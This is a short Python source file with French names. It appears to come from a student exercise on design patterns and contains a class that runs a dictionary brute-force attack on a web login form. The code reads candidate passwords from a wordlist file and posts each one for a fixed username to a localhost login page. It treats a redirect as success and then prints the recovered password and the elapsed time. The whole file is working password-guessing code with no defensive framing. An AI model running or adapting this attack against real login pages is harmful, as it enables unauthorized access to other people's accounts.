
import time
import requests

from Crack import Crack


class Dictionnaire(Crack):

    def cracker(self):
          trouver = True
          url = 'http://localhost/FactoryMethode/index.php'
          payload = {
            'username': 'arona',
            'pass' : ""
        }

          with open("dico2.txt", 'r') as filin:
              lignes = filin.read().split()
              print("--------------------------------------------------")
              print("Waiting for attack ")
          debut = time.time()
          for ligne in lignes:
                payload['pass'] = ligne
                with requests.Session() as s:
                    s.get(url)
                    r = s.post(url,data=payload)
                    if(r.history):
                        trouver= False
                        break
          dure = time.ctime(time.time()-debut)[11:19]
          if(trouver):
            print("-----------Echec------------")
          else :
             print(f"Mot de pass trouvé en : {dure} s\n")
             print(f"le mot de pass est :  \"{payload['pass']}\"")




            #   if ligne == password :
            #           dure = time.ctime(time.time()-debut)[11:19]
            #           self.showPassword(ligne)
                     
            #           print(f"Mot de pass trouvé en : {dure} s")
            #           break